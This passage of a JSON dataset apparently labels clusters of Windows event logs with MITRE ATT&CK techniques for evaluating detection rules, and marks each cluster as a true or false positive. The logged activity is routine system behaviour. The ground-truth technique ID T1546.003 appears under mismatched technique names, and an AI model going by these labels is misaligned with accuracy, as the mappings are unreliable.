        {
          "idx": 1612,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:43:42.959000+00:00",
          "Image": "C:\\windows\\Explorer.EXE",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\Capabilities"
        },
        {
          "idx": 1615,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:43:42.960000+00:00",
          "Image": "C:\\windows\\Explorer.EXE",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\Capabilities"
        },
        {
          "idx": 1613,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:43:42.960000+00:00",
          "Image": "C:\\windows\\Explorer.EXE",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\Capabilities"
        },
        {
          "idx": 1614,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:43:42.960000+00:00",
          "Image": "C:\\windows\\Explorer.EXE",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\Capabilities"
        },
        {
          "idx": 1616,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:43:42.961000+00:00",
          "Image": "C:\\windows\\Explorer.EXE",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\Capabilities"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "Modify Registry",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": true,
      "gt_notes": "auto: anchor-kw(powershell)"
    },
    {
      "group_id": "T1134_676",
      "rule_technique_id": "T1134",
      "rule_technique_name": "Access Token Manipulation",
      "confidence": 0.67,
      "anchor": {
        "idx": 676,
        "EventID": 4673,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:43:28.557000+00:00"
      },
      "num_events": 573,
      "event_id_distribution": {
        "10": 566,
        "1": 5,
        "4673": 2
      },
      "sample_logs": [
        {
          "idx": 327,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:20.358000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 330,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:20.360000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 332,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:21.356000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 333,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:21.356000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 334,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:21.357000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 335,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:21.358000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 348,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:21.364000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 349,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:21.364000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 365,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:23.365000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 364,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:23.365000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 366,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:23.366000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 368,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:23.367000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 385,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:25.382000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 389,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:25.384000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 392,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:43:25.385000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "Access Token Manipulation",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1134)"
    },
    {
      "group_id": "T1543_003_23364",
      "rule_technique_id": "T1543.003",
      "rule_technique_name": "Windows Service",
      "confidence": 1.0,
      "anchor": {
        "idx": 23364,
        "EventID": 4697,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:45:39.156000+00:00"
      },
      "num_events": 51,
      "event_id_distribution": {
        "11": 18,
        "4697": 18,
        "1": 15
      },
      "sample_logs": [
        {
          "idx": 19651,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.227000+00:00",
          "Image": "System",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19732,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:45:30.229000+00:00",
          "Image": "C:\\Windows\\System32\\svchost.exe",
          "CommandLine": "C:\\windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc",
          "ParentImage": "C:\\Windows\\System32\\services.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 19812,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.230000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19874,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.232000+00:00",
          "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19932,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.234000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19934,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.234000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 20340,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:45:30.506000+00:00",
          "Image": "C:\\Windows\\System32\\svchost.exe",
          "CommandLine": "C:\\windows\\System32\\svchost.exe -k NetworkService -p -s DoSvc",
          "ParentImage": "C:\\Windows\\System32\\services.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 20359,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:45:30.506000+00:00",
          "Image": "C:\\Windows\\System32\\svchost.exe",
          "CommandLine": "C:\\windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s fhsvc",
          "ParentImage": "C:\\Windows\\System32\\services.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 20441,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:45:30.508000+00:00",
          "Image": "C:\\Windows\\System32\\svchost.exe",
          "CommandLine": "C:\\windows\\System32\\svchost.exe -k NetSvcs -p -s NcaSvc",
          "ParentImage": "C:\\Windows\\System32\\services.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 20556,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.718000+00:00",
          "Image": "System",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 21582,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:38.219000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 21965,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:38.583000+00:00",
          "Image": "C:\\windows\\system32\\netsh.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 22045,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:45:38.584000+00:00",
          "Image": "C:\\Windows\\System32\\dispdiag.exe",
          "CommandLine": "C:\\windows\\system32\\dispdiag.exe -out dispdiag_start.dat",
          "ParentImage": "C:\\Windows\\System32\\netsh.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 22141,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:45:38.586000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "\\??\\C:\\windows\\system32\\conhost.exe 0xffffffff -ForceV1",
          "ParentImage": "C:\\Windows\\System32\\dispdiag.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 22774,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:38.892000+00:00",
          "Image": "C:\\windows\\system32\\dispdiag.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "Windows Service",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1543.003)"
    },
    {
      "group_id": "T1546_003_5424",
      "rule_technique_id": "T1546.003",
      "rule_technique_name": "Windows Management Instrumentation Event Subscription",
      "confidence": 1.0,
      "anchor": {
        "idx": 5424,
        "EventID": 20,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:44:40.932000+00:00"
      },
      "num_events": 2049,
      "event_id_distribution": {
        "13": 1094,
        "12": 931,
        "1": 19,
        "5861": 2,
        "20": 2,
        "5860": 1
      },
      "sample_logs": [
        {
          "idx": 5304,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:36.861000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{6ECBA0BF-67F5-499E-901F-82973C1091FF}\\MatchAnyKeyword"
        },
        {
          "idx": 5310,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:37.854000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{6ECBA0BF-67F5-499E-901F-82973C1091FF}\\MatchAllKeyword"
        },
        {
          "idx": 5312,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:37.856000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{6EE36D33-0D93-4098-8FF9-D8C5635ABEFD}"
        },
        {
          "idx": 5326,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:39.867000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{6EE36D33-0D93-4098-8FF9-D8C5635ABEFD}\\Enabled"
        },
        {
          "idx": 5347,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:40.892000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{6EE36D33-0D93-4098-8FF9-D8C5635ABEFD}\\EnableLevel"
        },
        {
          "idx": 5348,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:40.892000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{6EE36D33-0D93-4098-8FF9-D8C5635ABEFD}\\EnableProperty"
        },
        {
          "idx": 5351,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:40.893000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{6EE36D33-0D93-4098-8FF9-D8C5635ABEFD}\\MatchAnyKeyword"
        },
        {
          "idx": 5356,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:40.894000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{6EE36D33-0D93-4098-8FF9-D8C5635ABEFD}\\MatchAllKeyword"
        },
        {
          "idx": 5359,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:40.896000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{70236F66-9B2F-5A62-BC44-6A04EBEFD108}"
        },
        {
          "idx": 5361,
          "EventID": 5861,
          "TimeCreated": "2020-09-04 20:44:40.896000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 5365,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:40.898000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{70236F66-9B2F-5A62-BC44-6A04EBEFD108}\\Enabled"
        },
        {
          "idx": 5373,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:40.903000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{70236F66-9B2F-5A62-BC44-6A04EBEFD108}\\EnableLevel"
        },
        {
          "idx": 5369,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:44:40.903000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 5371,
          "EventID": 5860,
          "TimeCreated": "2020-09-04 20:44:40.903000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 5366,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:40.903000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\AutoLogger-Diagtrack-Listener\\{70236F66-9B2F-5A62-BC44-6A04EBEFD108}\\EnableProperty"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "Windows Management Instrumentation Event Subscription",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": true,
      "gt_notes": "auto: rule-exact(c=1.00)"
    },
    {
      "group_id": "T1003_71334",
      "rule_technique_id": "T1003",
      "rule_technique_name": "OS Credential Dumping",
      "confidence": 0.75,
      "anchor": {
        "idx": 71334,
        "EventID": 10,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:47:20.094000+00:00"
      },
      "num_events": 12,
      "event_id_distribution": {
        "4656": 4,
        "4663": 4,
        "10": 3,
        "4670": 1
      },
      "sample_logs": [
        {
          "idx": 71334,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:47:20.094000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 71845,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:47:20.332000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 72414,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:47:27.732000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 73808,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:47:40.986000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 73810,
          "EventID": 4663,
          "TimeCreated": "2020-09-04 20:47:40.986000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 73832,
          "EventID": 4663,
          "TimeCreated": "2020-09-04 20:47:40.986000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 73836,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:47:40.986000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 73840,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:47:40.987000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 73842,
          "EventID": 4663,
          "TimeCreated": "2020-09-04 20:47:40.987000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 73857,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:47:40.987000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 73860,
          "EventID": 4663,
          "TimeCreated": "2020-09-04 20:47:40.987000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74255,
          "EventID": 4670,
          "TimeCreated": "2020-09-04 20:47:41.302000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "OS Credential Dumping",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1003)"
    },
    {
      "group_id": "T1003_001_4794",
      "rule_technique_id": "T1003.001",
      "rule_technique_name": "LSASS Memory",
      "confidence": 0.62,
      "anchor": {
        "idx": 4794,
        "EventID": 10,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:44:10.609000+00:00"
      },
      "num_events": 119,
      "event_id_distribution": {
        "7": 80,
        "4656": 17,
        "13": 11,
        "4663": 6,
        "1": 4,
        "10": 1
      },
      "sample_logs": [
        {
          "idx": 3255,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:44:00.831000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "\"CollectGuestLogs.exe\" -Mode:ga -FileName:C:\\WindowsAzure\\CollectGuestLogsTemp\\5bd8d21f-ae52-47f7-84f4-7cec337c3a5d.zip",
          "ParentImage": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\WaAppAgent.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 3259,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:44:00.833000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "\\??\\C:\\windows\\system32\\conhost.exe 0xffffffff -ForceV1",
          "ParentImage": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 3260,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:44:00.833000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3262,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:44:00.834000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3264,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:44:00.835000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3265,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:44:00.835000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3266,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:44:00.836000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3267,
          "EventID": 4663,
          "TimeCreated": "2020-09-04 20:44:00.836000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3268,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:44:00.837000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3271,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:44:00.838000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3274,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:44:00.839000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3275,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:44:00.839000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3276,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:44:00.840000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3279,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:44:00.841000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3281,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:44:00.842000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "LSASS Memory",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1003.001)"
    },
    {
      "group_id": "T1016_27738",
      "rule_technique_id": "T1016",
      "rule_technique_name": "System Network Configuration Discovery",
      "confidence": 1.0,
      "anchor": {
        "idx": 27738,
        "EventID": 1,
        "Image": "C:\\Windows\\System32\\ROUTE.EXE",
        "CommandLine": "\"route.exe\" print",
        "TimeCreated": "2020-09-04 20:45:47.542000+00:00"
      },
      "num_events": 98,
      "event_id_distribution": {
        "7": 60,
        "12": 29,
        "13": 5,
        "1": 2,
        "5": 2
      },
      "sample_logs": [
        {
          "idx": 22100,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:38.586000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 22609,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:38.887000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 22758,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:38.892000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 23229,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.153000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 23234,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.153000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 23324,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:39.155000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 23512,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:39.394000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 23629,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:39.397000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 23721,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.399000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24085,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.732000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24087,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.732000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24089,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.732000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24129,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.733000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24532,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:40.009000+00:00",
